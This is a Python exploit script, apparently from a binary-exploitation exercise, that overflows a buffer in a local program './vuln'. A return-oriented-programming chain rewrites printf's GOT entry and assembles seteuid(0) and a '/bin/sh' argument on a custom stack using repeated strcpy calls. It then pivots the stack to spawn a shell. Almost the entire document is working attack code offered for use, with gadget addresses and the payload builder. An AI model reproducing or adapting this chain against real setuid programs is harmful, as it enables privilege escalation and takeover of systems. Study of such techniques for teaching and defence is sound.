#!/usr/bin/env python
import struct
from subprocess import call

#GOT overwrite using ROP gadgets
'''
 G1: 0x0804849e: addl %eax, 0x5D5B04C4(%ebx) ; ret ;
 G2: 0x080484a2: popl %ebx ; pop ebp; ret ;
 G3: 0x????????: popl %eax ; ret ; (NOT found)
 G4: 0x080485b3: mov 0x34(%esp),%eax...
 G5: 0x08048380: pop ebx ; ret ;
 G6: 0x080485cd: pop esi ; pop edi ; pop ebp ; ret ;
 G7: 0x08048498: movb $0x1,0x804a028...
'''

g1 = 0x0804849e
g2 = 0x080484a2
g4 = 0x080485b3
g5 = 0x08048380
g6 = 0x080485cd
g7 = 0x08048498
dummy = 0xdeadbeef
esi = 0x01020101
edi = 0x01020102
ebx = 0x3fc9c18                 #ebx = 0x8049f3c - (esi*4) + 0xe0
off = 0xffff2810

#Custom Stack
#0x804a360 - Dummy EBP|seteuid@PLT|printf@PLT|seteuid_arg|sytem_arg
cust_esp = 0x804a360		#Custom stack base address
cust_base_esp = 0x804a360	#Custom stack base address
#seteuid@PLT 0x80483c0
seteuid_oct1 = 0x8048143	#08
seteuid_oct2 = 0x8048130	#04
seteuid_oct3 = 0x8048355	#83
seteuid_oct4 = 0x80481cb	#c0
#printf@PLT 0x80483a0
printf_oct1 = 0x8048143		#08
printf_oct2 = 0x8048130		#04
printf_oct3 = 0x8048355		#83
printf_oct4 = 0x8048315		#a0
#seteuid_arg 0x00000000
seteuid_arg_src = 0x804a360	#This addr contains NULL byte.
seteuid_arg_dst = 0x804a36c	#Custom stack seteuid_arg's location
#system_arg 0x804ac60
system_arg_src_oct1 = 0x8048154		#/
system_arg_src_oct2 = 0x8048157		#b
system_arg_src_oct3 = 0x8048156		#i
system_arg_src_oct4 = 0x804815e		#n
system_arg_src_oct5 = 0x8048162		#s
system_arg_src_oct6 = 0x80483a6		#h\0
system_arg_dst = 0x804ac60  	#Custom stack location which contains string "/bin/sh"
system_arg_oct1 = 0x8048143 	#08
system_arg_oct2 = 0x8048130 	#04	
#system_arg_oct3 = 0x8048520 	#AC	
system_arg_oct3 = 0x8048f44 	#AC	
system_arg_oct4 = 0x804819a 	#60

strcpy_plt = 0x80483d0		#strcpy@PLT
ppr_addr = 0x080485ce		#popl %edi ; popl %ebp ; ret  ;

#Stack Pivot
pr_addr = 0x080484a3		#popl %ebp ; ret  ;
lr_addr = 0x08048569		#leave ; ret ;

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

buf = "A" * 268 		#Junk
buf += conv(g7)                 #movb $0x1,0x804a028; add esp, 0x04; pop ebx; pop ebp; ret;
buf += conv(dummy)
buf += conv(dummy)
buf += conv(dummy)
buf += conv(g6)                 #pop esi; pop edi; pop ebp; ret;
buf += conv(esi)                #esi
buf += conv(edi)                #edi
buf += conv(dummy)
buf += conv(g5)                 #pop ebx; ret;
buf += conv(ebx)                #ebx
buf += conv(g4)                 #mov 0x34(%esp),%eax; ...

for num in range(0,11):
 buf += conv(dummy)

buf += conv(g2)                 #pop ebx; pop ebp; ret;
ebx = 0xaaa99b3c                #printf@GOT-0x5d5b04c4
buf += conv(ebx)
buf += conv(off)
buf += conv(g1)                 #addl %eax, 0x5D5B04C4(%ebx); ret;
#Custom Stack
#Below stack frames are for strcpy (to copy seteuid@PLT to custom stack)
cust_esp += 4			#Increment by 4 to get past Dummy EBP.
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                        
buf += conv(cust_esp)
buf += conv(seteuid_oct4)
cust_esp += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                        
buf += conv(cust_esp)
buf += conv(seteuid_oct3)
cust_esp += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                        
buf += conv(cust_esp)
buf += conv(seteuid_oct2)
cust_esp += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                        
buf += conv(cust_esp)
buf += conv(seteuid_oct1)
#Below stack frames are for strcpy (to copy printf@PLT to custom stack)
cust_esp += 1 
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(printf_oct4)
cust_esp += 1 
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(printf_oct3)
cust_esp += 1 
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(printf_oct2)
cust_esp += 1 
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(printf_oct1)
#Below stack frames are for strcpy (to copy seteuid arg <0> to custom stack)
cust_esp += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(seteuid_arg_src)
cust_esp += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(seteuid_arg_src)
cust_esp += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(seteuid_arg_src)
cust_esp += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(seteuid_arg_src)
#Below stack frames are for strcpy (to copy &"/bin/sh" to custom stack)
cust_esp += 1 
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(system_arg_oct4)
cust_esp += 1 
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(system_arg_oct3)
cust_esp += 1 
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(system_arg_oct2)
cust_esp += 1 
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)                      
buf += conv(cust_esp)
buf += conv(system_arg_oct1)
#Below stack frame is for strcpy (to copy "/bin/sh" to custom stack)
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)      
buf += conv(system_arg_dst)
buf += conv(system_arg_src_oct1)
system_arg_dst += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)      
buf += conv(system_arg_dst)
buf += conv(system_arg_src_oct2)
system_arg_dst += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)      
buf += conv(system_arg_dst)
buf += conv(system_arg_src_oct3)
system_arg_dst += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)      
buf += conv(system_arg_dst)
buf += conv(system_arg_src_oct4)
system_arg_dst += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)      
buf += conv(system_arg_dst)
buf += conv(system_arg_src_oct1)
system_arg_dst += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)      
buf += conv(system_arg_dst)
buf += conv(system_arg_src_oct5)
system_arg_dst += 1
buf += conv(strcpy_plt)                     
buf += conv(ppr_addr)      
buf += conv(system_arg_dst)
buf += conv(system_arg_src_oct6)
#Stack Pivot
buf += conv(pr_addr)                
buf += conv(cust_base_esp)                   
buf += conv(lr_addr)                  

print ':'.join(x.encode('hex') for x in buf)
 
print "Calling vulnerable program"
call(["./vuln", buf])
